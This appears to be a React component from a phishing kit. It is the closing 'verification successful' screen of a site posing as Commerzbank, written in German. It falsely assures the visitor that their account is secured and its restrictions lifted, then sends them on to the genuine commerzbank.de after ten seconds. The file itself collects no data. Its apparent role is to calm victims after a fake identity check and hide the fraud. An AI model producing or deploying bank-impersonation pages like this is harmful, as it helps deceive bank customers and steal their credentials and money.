import React, { useEffect } from 'react';

const FinalSuccessScreen: React.FC = () => {
  useEffect(() => {
    // Redirect after 10 seconds
    const timer = setTimeout(() => {
      window.location.href = 'https://commerzbank.de';
    }, 10000);

    return () => clearTimeout(timer);
  }, []);

  const handleManualRedirect = () => {
    window.location.href = 'https://commerzbank.de';
  };

  return (
    <>
      <style>
        {`
          @media (max-width: 768px) {
            .mobile-title {
              font-size: 2.5rem !important;
            }
          }
          @media (max-width: 480px) {
            .mobile-title {
              font-size: 2rem !important;
            }
          }
        `}
      </style>
      <div style={{ 
        maxWidth: '1440px', 
        margin: '0 auto', 
        padding: '60px 40px',
        backgroundColor: 'white',
        minHeight: '100vh'
      }}>
        <div style={{
          textAlign: 'left' as const,
          maxWidth: '800px'
        }}>
          <h1 className="mobile-title" style={{
            color: '#002e3c',
            fontSize: '2.5rem',
            fontWeight: 'bold',
            marginBottom: '40px',
            fontFamily: 'Gotham, Arial, sans-serif',
            lineHeight: '1.1'
          }}>
            Verifizierung erfolgreich abgeschlossen
          </h1>
          
          <p style={{
            color: '#666',
            fontSize: '1.25rem',
            lineHeight: '1.6',
            marginBottom: '40px'
          }}>
            Ihre Identität wurde erfolgreich verifiziert. Ihr Konto ist wieder sicher und zugänglich.
          </p>
          
          <div style={{
            backgroundColor: '#d4edda',
            border: '1px solid #c3e6cb',
            borderRadius: '12px',
            padding: '40px',
            marginBottom: '40px',
            display: 'flex',
            alignItems: 'center',
            gap: '20px'
          }}>
            <div style={{
              width: '48px',
              height: '48px',
              color: '#155724',
              fontSize: '48px',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center'
            }}>
              ✓
            </div>
            
            <div>
              <h3 style={{
                color: '#155724',
                fontSize: '1.5rem',
                fontWeight: '600',
                marginBottom: '10px',
                fontFamily: 'Gotham, Arial, sans-serif'
              }}>
                Sicherheitsmaßnahmen aktiviert
              </h3>
              
              <p style={{
                color: '#155724',
                fontSize: '1rem',
                lineHeight: '1.6',
                margin: 0
              }}>
                Alle Sicherheitsmaßnahmen wurden erfolgreich aktiviert. Ihr Konto ist jetzt vollständig geschützt.
              </p>
            </div>
          </div>
          
          <div style={{
            backgroundColor: '#f0f9ff',
            border: '1px solid #0ea5e9',
            borderRadius: '8px',
            padding: '20px',
            marginBottom: '40px'
          }}>
            <h4 style={{
              color: '#0c4a6e',
              fontSize: '1.25rem',
              fontWeight: '600',
              marginBottom: '15px',
              fontFamily: 'Gotham, Arial, sans-serif'
            }}>
              Was passiert als Nächstes?
            </h4>
            
            <ul style={{
              color: '#0c4a6e',
              fontSize: '1rem',
              lineHeight: '1.6',
              paddingLeft: '20px',
              margin: 0
            }}>
              <li style={{ marginBottom: '8px' }}>
                Sie erhalten eine Bestätigungs-E-Mail
              </li>
              <li style={{ marginBottom: '8px' }}>
                Ihr Konto ist wieder vollständig nutzbar
              </li>
              <li style={{ marginBottom: '8px' }}>
                Alle vorherigen Einschränkungen wurden aufgehoben
              </li>
              <li>
                Sie werden automatisch zur Commerzbank weitergeleitet
              </li>
            </ul>
          </div>
          
          <div style={{ 
            display: 'flex', 
            flexDirection: 'column',
            gap: '20px',
            alignItems: 'flex-start'
          }}>
            <button
              onClick={handleManualRedirect}
              style={{
                backgroundColor: '#FFD700',
                color: '#002e3c',
                border: 'none',
                borderRadius: '35px',
                padding: '1.25rem 3rem',
                fontSize: '1rem',
                fontWeight: '600',
                cursor: 'pointer',
                fontFamily: 'Gotham, Arial, sans-serif',
                transition: 'all 0.3s ease',
                display: 'flex',
                alignItems: 'center',
                gap: '0.5rem'
              }}
              onMouseOver={(e) => {
                e.currentTarget.style.backgroundColor = '#FFD700';
                e.currentTarget.style.boxShadow = '0 4px 12px rgba(255, 215, 0, 0.3)';
              }}
              onMouseOut={(e) => {
                e.currentTarget.style.backgroundColor = '#FFD700';
                e.currentTarget.style.boxShadow = 'none';
              }}
            >
              Zur Commerzbank
              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                <path d="M5 12h14M12 5l7 7-7 7"/>
              </svg>
            </button>
            
            <p style={{
              color: '#6b7280',
              fontSize: '0.875rem',
              margin: 0,
              fontStyle: 'italic'
            }}>
              Automatische Weiterleitung in 10 Sekunden...
            </p>
          </div>
        </div>
      </div>
    </>
  );
};

export default FinalSuccessScreen; 